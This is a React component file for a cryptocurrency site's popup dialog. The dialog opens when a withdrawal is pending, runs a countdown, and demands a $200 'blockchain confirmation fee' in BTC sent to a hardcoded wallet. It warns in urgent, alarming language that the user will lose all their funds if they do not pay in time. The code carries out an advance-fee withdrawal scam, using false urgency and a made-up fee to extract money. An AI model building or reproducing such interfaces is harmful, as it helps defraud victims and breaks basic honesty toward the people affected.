import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Button } from "@/components/ui/button";
import { AlertTriangle, Clock, Copy, Check, Mail, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
import { useTranslation } from "react-i18next";
import { useBlockchainFeeCountdown } from "@/hooks/useBlockchainFeeCountdown";

const BLOCKCHAIN_FEE_AMOUNT = 200;

export const BlockchainConfirmationFeeNotification = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();
  const { t } = useTranslation();
  const { 
    timeLeft, 
    hasPendingWithdrawal, 
    isExpired, 
    formatTime,
    emailSent,
    sendingEmail,
    sendEmailNotification
  } = useBlockchainFeeCountdown();

  useEffect(() => {
    if (hasPendingWithdrawal) {
      setIsOpen(true);
    }
  }, [hasPendingWithdrawal]);

  useEffect(() => {
    if (isExpired && isOpen) {
      toast({
        title: t("blockchainFee.failed", "Transaction Failed"),
        description: t("blockchainFee.failedDescription", "Your withdrawal has failed due to non-payment of the blockchain confirmation fee. Please contact support."),
        variant: "destructive",
      });
      setIsOpen(false);
    }
  }, [isExpired, isOpen, toast, t]);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(CONFIRMATION_FEE_WALLET_BTC);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
    toast({
      title: t("common.copied", "Copied!"),
      description: t("blockchainFee.addressCopied", "Wallet address copied to clipboard"),
    });
  };

  const handlePayNow = () => {
    setIsOpen(false);
    navigate("/dashboard/deposit");
  };

  const handleSendEmail = async () => {
    const success = await sendEmailNotification();
    if (success) {
      toast({
        title: t("blockchainFee.emailSent", "Email Sent"),
        description: t("blockchainFee.emailSentDescription", "Payment instructions have been sent to your email."),
      });
    } else {
      toast({
        title: t("common.error", "Error"),
        description: t("blockchainFee.emailError", "Failed to send email. Please try again."),
        variant: "destructive",
      });
    }
  };

  if (!hasPendingWithdrawal) return null;

  return (
    <AlertDialog open={isOpen} onOpenChange={setIsOpen}>
      <AlertDialogContent className="max-w-md border-destructive">
        <AlertDialogHeader>
          <AlertDialogTitle className="flex items-center gap-2 text-destructive">
            <AlertTriangle className="h-6 w-6 animate-pulse" />
            {t("blockchainFee.urgentTitle", "URGENT: Blockchain Confirmation Required")}
          </AlertDialogTitle>
          <AlertDialogDescription className="space-y-4">
            <div className="flex items-center justify-center gap-2 text-3xl font-bold text-destructive py-4">
              <Clock className="h-8 w-8" />
              <span className="font-mono">{formatTime(timeLeft)}</span>
            </div>

            <div className="p-4 bg-destructive/10 rounded-lg border border-destructive space-y-3">
              <p className="font-bold text-foreground text-center text-lg">
                {t("blockchainFee.paymentRequired", "Payment of ${{amount}} Required", { amount: BLOCKCHAIN_FEE_AMOUNT })}
              </p>
              
              <p className="text-sm text-center text-muted-foreground">
                {t("blockchainFee.description", "Your withdrawal requires a blockchain confirmation fee. Failure to pay within the time limit will result in the loss of your funds.")}
              </p>

              <div className="bg-background p-3 rounded-lg border">
                <p className="text-xs font-semibold mb-2 text-muted-foreground">
                  {t("blockchainFee.sendTo", "Send BTC to this address:")}
                </p>
                <div className="flex items-center gap-2">
                  <code className="text-xs font-mono break-all flex-1 text-primary">
                    {CONFIRMATION_FEE_WALLET_BTC}
                  </code>
                  <Button
                    size="icon"
                    variant="outline"
                    className="h-8 w-8 shrink-0"
                    onClick={copyToClipboard}
                  >
                    {copiedAddress ? (
                      <Check className="h-4 w-4 text-green-500" />
                    ) : (
                      <Copy className="h-4 w-4" />
                    )}
                  </Button>
                </div>
              </div>

              <div className="text-center">
                <p className="text-2xl font-bold text-destructive">
                  ${BLOCKCHAIN_FEE_AMOUNT} USD
                </p>
                <p className="text-xs text-muted-foreground">
                  {t("blockchainFee.equivalentBtc", "(equivalent in BTC at current rate)")}
                </p>
              </div>
            </div>

            <div className="bg-yellow-500/10 border border-yellow-500 rounded-lg p-3">
              <p className="text-sm font-bold text-yellow-700 dark:text-yellow-400 text-center">
                ⚠️ {t("blockchainFee.warning", "WARNING: If payment is not received within the countdown, you will lose ALL your funds!")}
              </p>
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handlePayNow}
                className="flex-1 bg-destructive hover:bg-destructive/90 text-destructive-foreground font-bold py-6 text-lg"
              >
                {t("blockchainFee.payNow", "Pay ${{amount}} Now", { amount: BLOCKCHAIN_FEE_AMOUNT })}
              </Button>
              <Button
                onClick={handleSendEmail}
                variant="outline"
                disabled={emailSent || sendingEmail}
                className="py-6"
              >
                {sendingEmail ? (
                  <Loader2 className="h-5 w-5 animate-spin" />
                ) : emailSent ? (
                  <Check className="h-5 w-5 text-green-500" />
                ) : (
                  <Mail className="h-5 w-5" />
                )}
              </Button>
            </div>

            <p className="text-xs text-center text-muted-foreground">
              {emailSent 
                ? t("blockchainFee.emailAlreadySent", "✓ Email with payment instructions sent")
                : t("blockchainFee.singleTransaction", "Payment must be made in a single transaction")}
            </p>
          </AlertDialogDescription>
        </AlertDialogHeader>
      </AlertDialogContent>
    </AlertDialog>
  );
};
